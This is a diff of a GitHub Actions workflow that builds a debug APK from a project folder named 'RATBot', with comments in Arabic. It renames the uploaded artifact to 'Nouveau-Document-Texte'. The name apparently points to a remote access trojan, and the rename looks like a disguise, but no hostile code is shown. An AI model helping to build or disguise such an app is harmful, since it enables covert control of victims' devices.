@@ -1,4 +1,4 @@
-name: Android CI Build
+name: Android Build Advanced
 
 on:
   push:
@@ -8,40 +8,32 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
-    - name: Checkout Code
-      uses: actions/checkout@v4
+      - name: Checkout Code
+        uses: actions/checkout@v4
 
-    - name: Set up JDK 17
-      uses: actions/setup-java@v4
-      with:
-        java-version: '17'
-        distribution: 'temurin'
-        cache: gradle
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
 
-    - name: Ultimate Build Script
-      run: |
-        # 1. البحث عن مكان ملف gradlew
-        GRADLEW_PATH=$(find . -name gradlew | head -n 1)
-        
-        if [ -z "$GRADLEW_PATH" ]; then
-          echo "❌ خطأ: لم يتم العثور على ملف gradlew. تأكد من رفع جميع ملفات المشروع!"
-          ls -R # لعرض الملفات الموجودة حالياً للتأكد
-          exit 1
-        fi
-        
-        # 2. الانتقال للمجلد الذي يحتوي على gradlew
-        PROJECT_ROOT=$(dirname "$GRADLEW_PATH")
-        echo "✅ تم العثور على المشروع في: $PROJECT_ROOT"
-        cd "$PROJECT_ROOT"
-        
-        # 3. إصلاح الصلاحيات وتشغيل البناء
-        chmod +x gradlew
-        ./gradlew assembleDebug --no-daemon
+      - name: Build APK
+        run: |
+          # الانتقال لمجلد المشروع
+          cd RATBot
+          
+          # التأكد من وجود ملف gradlew وإصلاحه
+          if [ ! -f "gradlew" ]; then
+            echo "❌ خطأ: ملف gradlew مفقود في مجلد RATBot!"
+            exit 1
+          fi
+          
+          chmod +x gradlew
+          ./gradlew assembleDebug
 
-    - name: Upload APK
-      uses: actions/upload-artifact@v4
-      with:
-        name: ratbot-advanced-apk
-        path: "**/app/build/outputs/apk/debug/*.apk"
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: Nouveau-Document-Texte
+          path: "RATBot/app/build/outputs/apk/debug/*.apk"
